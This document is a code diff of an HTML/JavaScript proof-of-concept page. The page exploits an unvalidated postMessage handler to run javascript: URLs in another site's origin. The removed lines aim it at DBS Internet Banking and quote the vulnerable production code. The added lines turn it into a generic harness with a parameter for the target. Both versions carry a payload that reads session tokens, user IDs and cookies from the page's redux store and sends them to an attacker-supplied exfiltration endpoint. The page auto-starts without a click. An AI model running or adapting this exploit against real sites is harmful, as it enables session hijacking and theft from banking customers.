@@ -3,64 +3,52 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>DBS iBanking postMessage → javascript: XSS — PoC</title>
+<title>unvalidated postMessage → javascript: — PoC harness</title>
 <style>
  :root{color-scheme:dark}
  body{margin:0;background:#0b1020;color:#e8eefc;font-family:system-ui,Segoe UI,Arial,sans-serif;line-height:1.55}
- .wrap{max-width:940px;margin:0 auto;padding:30px 22px 60px}
- h1{font-size:21px;margin:0 0 6px;letter-spacing:-.2px}
- h2{font-size:14px;text-transform:uppercase;letter-spacing:.08em;color:#8ea0c8;margin:26px 0 8px}
+ .wrap{max-width:920px;margin:0 auto;padding:30px 22px 60px}
+ h1{font-size:20px;margin:0 0 6px;letter-spacing:-.2px}
+ h2{font-size:13px;text-transform:uppercase;letter-spacing:.08em;color:#8ea0c8;margin:26px 0 8px}
  .sub{color:#8ea0c8;font-size:13.5px}
  code{background:#111a2e;padding:1px 5px;border-radius:4px;font-size:12.5px}
- a{color:#7fb0ff}
  .box{border:1px solid #1d2b48;background:#0e1526;border-radius:10px;padding:14px 16px;margin:10px 0}
- button{background:#2f6df6;color:#fff;border:0;border-radius:8px;padding:12px 18px;font-size:14.5px;
+ input{background:#05070f;border:1px solid #1d2b48;color:#e8eefc;border-radius:6px;
+       padding:9px 10px;font-size:13px;width:100%;box-sizing:border-box;margin:6px 0 10px}
+ button{background:#2f6df6;color:#fff;border:0;border-radius:8px;padding:11px 16px;font-size:14px;
         cursor:pointer;margin:0 8px 8px 0}
  button.alt{background:#233258}
- button.alt2{background:#3a2440}
  pre{background:#05070f;border:1px solid #1d2b48;border-radius:8px;padding:12px;font-size:12px;
      white-space:pre-wrap;word-break:break-all;max-height:300px;overflow:auto;margin:6px 0}
- .k{color:#7fe3a1}.w{color:#ffd166}.e{color:#ff7b72}.d{color:#8ea0c8}
- table{border-collapse:collapse;width:100%;font-size:13px}
- td,th{border-bottom:1px solid #1d2b48;padding:6px 8px;text-align:left;vertical-align:top}
- th{color:#8ea0c8;font-weight:600}
+ .k{color:#7fe3a1}.w{color:#ffd166}.e{color:#ff7b72}
 </style>
 </head>
 <body>
 <div class="wrap">
 
-<h1>DBS Internet Banking — <code>postMessage</code> → <code>javascript:</code> XSS</h1>
+<h1>Unvalidated <code>postMessage</code> → <code>javascript:</code> — PoC harness</h1>
 <div class="sub">
-  Target origin: <code>internet-banking.dbs.com.sg</code> · vulnerable page:
-  <code>/digi-web/ngib/cul-onboarding</code> (<i>Apply for DBS Chromo Card</i>).
-  The page registers <code>window.addEventListener('message', …)</code> and, for
-  <code>{type:'REDIRECT_TO_SINGPASS', source:'mfe'}</code>, executes
-  <code>window.top.location.href = e.data.url</code> — <b>without checking <code>e.origin</code>,
-  <code>e.source</code> or the URL scheme</b>, although the sibling branch in the same handler does check
-  <code>e.origin</code>. A <code>javascript:</code> URL therefore runs in the bank origin.
+  Generic driver for pages whose <code>message</code> handler takes a URL from the message and
+  navigates to it (<code>location.href = e.data.url</code>) without validating <code>e.origin</code>,
+  <code>e.source</code> or the URL scheme. The target is supplied as a parameter, so this file carries
+  no target-specific data.
 </div>
 
 <div class="box">
-  <h2 style="margin-top:0">Run the PoC</h2>
-  <button id="go">Open the bank window &amp; send the message</button>
-  <button class="alt" id="steal">Token-theft payload</button>
-  <button class="alt2" id="nav">Variant: only deliver REDIRECT_TO_SINGPASS</button>
-  <div class="sub" id="hookinfo"></div>
-</div>
-
-<div class="box">
-  <h2 style="margin-top:0">What you should see</h2>
-  <table>
-    <tr><th>Payload</th><th>Expected result inside the DBS window</th></tr>
-    <tr><td>A (default)</td><td><code>alert()</code> whose text starts with <i>“XSS in the iBanking origin: internet-banking.dbs.com.sg”</i>, and <code>document.title</code> becomes <code>PWNED_BY_OPENER</code></td></tr>
-    <tr><td>B (token theft)</td><td><code>alert()</code> showing <code>tokenId=…&amp;cookie=…</code> read out of the SPA's redux store, plus a request to the hook URL if one is supplied</td></tr>
-  </table>
-  <div class="sub" style="margin-top:10px">
-    <b>Precondition (unavoidable):</b> the handler only exists on a post-login SPA route, and a browser
-    window cannot inherit an in-memory session by navigation — so the tester must be signed in
-    <i>inside</i> the window this page opens, and then reach the card-application page in it.
-    See <code>README.md</code> for the exact reproduction and for the feature-flag caveat.
+  <h2 style="margin-top:0">Target</h2>
+  <input id="target" placeholder="https://target.example/path/" spellcheck="false">
+  <div class="sub">
+    Query parameters: <code>?target=…</code> page to open · <code>p=steal</code> session-read payload ·
+    <code>hook=…</code> exfiltration endpoint · <code>msg=…</code> JSON message to send (advanced) ·
+    <code>auto=0</code> disable auto-start
   </div>
+  <button id="go">Open target &amp; send message</button>
+  <button class="alt" id="steal">Session-read payload</button>
+</div>
+
+<div class="box">
+  <h2 style="margin-top:0">Message sent</h2>
+  <pre id="msgbox">(not started)</pre>
 </div>
 
 <h2>Log</h2>
@@ -68,23 +56,29 @@
 
 </div>
 <script>
-/* ----------------------------------------------------------------------------------------------
-   The vulnerable handler (production code, static/js/8333.0883565b.chunk.js, module 38241):
-     else { pn.store();
-            try { var r = e.data.url;
-                  window.top ? window.top.location.href = r : window.parent.location.href = r;
-            } catch(d) {} }
-   No e.origin / e.source / protocol validation on this branch.
-   ---------------------------------------------------------------------------------------------- */
 var P = new URLSearchParams(location.search);
-var HOOK = P.get('hook') || '';                 /* optional exfiltration endpoint */
-var TARGET = P.get('target') || 'https://internet-banking.dbs.com.sg/digi-web/ngib/';
+var TARGET  = P.get('target') || '';
+var HOOK    = P.get('hook') || '';
+var CUSTOM  = P.get('msg') || '';
+var PAYLOAD = P.get('p') === 'steal' ? 'steal' : 'alert';
+
+document.getElementById('target').value = TARGET;
+
+/* default message: the shape these handoff handlers usually accept */
+function defaultMsg(url){
+  return { type: 'REDIRECT_TO_SINGPASS', source: 'mfe', url: url };
+}
+function buildMsg(url){
+  if(!CUSTOM) return defaultMsg(url);
+  try { return JSON.parse(CUSTOM.replace(/__URL__/g, url)); } catch(e){ return defaultMsg(url); }
+}
 
 var P_ALERT =
  "javascript:if(!window.__pwn){window.__pwn=1;" +
- "alert('XSS in the iBanking origin: '+document.domain+' (url: '+location.pathname+')');" +
- "document.title='PWNED_BY_OPENER'}"
+ "alert('script executed in the target origin: '+document.domain+' '+location.pathname);" +
+ "document.title='PWNED_BY_OPENER'}";
 
+/* reads a typical SPA session store (redux) through the React fiber tree and shows/forwards it */
 var P_STEAL =
  "javascript:(function(){try{if(window.__pwn2)return;window.__pwn2=1;" +
    "var r=document.getElementById('root');" +
@@ -93,66 +87,53 @@ var P_STEAL =
    "while(q.length&&n++<300000){f=q.shift();if(!f)continue;p=f.memoizedProps;" +
    "if(p&&p.store&&p.store.dispatch){s=p.store;break}" +
    "if(f.child)q.push(f.child);if(f.sibling)q.push(f.sibling);}" +
-   "var a=(s&&s.getState().auth)||{};" +
+   "var a=(s&&s.getState&&(s.getState().auth||s.getState().session))||{};" +
    "var out='tokenId='+a.tokenId+'&userId='+a.userId+'&cookie='+document.cookie;" +
    "document.title='TOKEN_TAKEN';" +
-   (HOOK ? "new Image().src='"+HOOK.replace(/'/g, "\\'")+"?'+encodeURIComponent(out);" : "") +
-   "alert('REDUCED PoC — data read from the session:\\n'+out.substring(0,220));" +
+   (HOOK ? "new Image().src='"+HOOK.replace(/'/g,"\\'")+"?'+encodeURIComponent(out);" : "") +
+   "alert('session data readable from the target origin:\\n'+out.substring(0,220));" +
  "}catch(e){alert('err '+e.message)}})()";
 
-var PAYLOAD = P_ALERT;
-var logEl = document.getElementById('log');
+var logEl = document.getElementById('log'), msgEl = document.getElementById('msgbox');
 function log(s, cls){
   var d = document.createElement('div'); if(cls) d.className = cls;
   d.textContent = '[' + new Date().toISOString().substr(11,8) + '] ' + s;
   logEl.appendChild(d); logEl.scrollTop = logEl.scrollHeight;
 }
-function msg(url){ return {type:'REDIRECT_TO_SINGPASS', source:'mfe', url:url}; }
 function safe(o, s){ try{ o.postMessage(s, '*'); return true; } catch(e){ return false; } }
 
 var win = null, timer = null, sent = 0;
 
 function start(){
-  PAYLOAD = (P.get('p') === 'steal') ? P_STEAL : P_ALERT;
-  document.getElementById('hookinfo').textContent =
-    HOOK ? ('Exfiltration hook: ' + HOOK) : 'No hook supplied (?hook=https://your-collector) — payload B will only display the data.';
+  TARGET = (document.getElementById('target').value || '').trim();
+  if(!TARGET){ log('no target given — put ?target=https://… in the URL or in the field', 'e'); return; }
+  if(!/^https:\/\//i.test(TARGET)){ log('target must be an https URL', 'e'); return; }
 
-  win = window.open(TARGET, 'dbs_victim');
-  if(!win){ log('Pop-up blocked. Allow pop-ups for this page and press the button again.', 'e'); return; }
+  var url = PAYLOAD === 'steal' ? P_STEAL : P_ALERT;
+  var msg = buildMsg(url);
+  msgEl.textContent = JSON.stringify(msg, null, 1);
+
+  win = window.open(TARGET, 'target_window');
+  if(!win){ log('pop-up blocked — allow pop-ups for this page and retry', 'e'); return; }
   log('opened ' + TARGET, 'k');
-  log('WindowProxy acquired — it stays valid while the victim signs in and the SPA routes internally', 'k');
+  log('WindowProxy acquired; it survives the target site signing in and routing internally', 'k');
 
   if(timer) clearInterval(timer);
-  /* 100 ms cadence + a burst every tick: the handler page can mount and unmount quickly while the
-     SPA settles, so the message is repeated densely instead of once per second */
   timer = setInterval(function(){
-    if(!win || win.closed){ log('bank window closed — stop', 'w'); clearInterval(timer); timer = null; return; }
+    if(!win || win.closed){ log('target window closed — stop', 'w'); clearInterval(timer); timer = null; return; }
     var ok = false;
-    for(var i = 0; i < 3; i++){ ok = safe(win, msg(PAYLOAD)) || ok; }
+    for(var i = 0; i < 3; i++){ ok = safe(win, msg) || ok; }
     if(ok){
       sent++;
-      if(sent % 50 === 1) log('postMessage x' + (sent*3) + ' delivered — waiting for the card-application page to mount');
+      if(sent % 50 === 1) log('message #' + (sent*3) + ' delivered — waiting for the vulnerable view');
     }
   }, 100);
-  log('message loop started (100 ms, 3 per tick)', 'k');
+  log('sender loop started (100 ms, 3 per tick)', 'k');
 }
 
-document.getElementById('go').addEventListener('click', function(){ P.delete('p'); start(); });
-document.getElementById('steal').addEventListener('click', function(){ P.set('p','steal'); start(); });
-document.getElementById('nav').addEventListener('click', function(){
-  /* minimal variant: prove the sender is unvalidated by steering the bank window to a same-site
-     URL (no script execution) — useful to show that the navigation itself is attacker-driven */
-  win = window.open(TARGET, 'dbs_victim');
-  if(!win) { log('pop-up blocked', 'e'); return; }
-  var i = setInterval(function(){
-    if(!win || win.closed){ clearInterval(i); return; }
-    safe(win, msg('https://internet-banking.dbs.com.sg/digi-web/ngib/?from=attacker_page'));
-  }, 400);
-  log('navigation-only variant running', 'k');
-});
-
-/* auto-start: a real campaign page does not need a click */
-if(P.get('auto') !== '0') window.addEventListener('load', function(){ setTimeout(start, 300); });
+document.getElementById('go').addEventListener('click', function(){ PAYLOAD = 'alert'; start(); });
+document.getElementById('steal').addEventListener('click', function(){ PAYLOAD = 'steal'; start(); });
+if(P.get('auto') !== '0') window.addEventListener('load', function(){ setTimeout(start, 250); });
 </script>
 </body>
 </html>
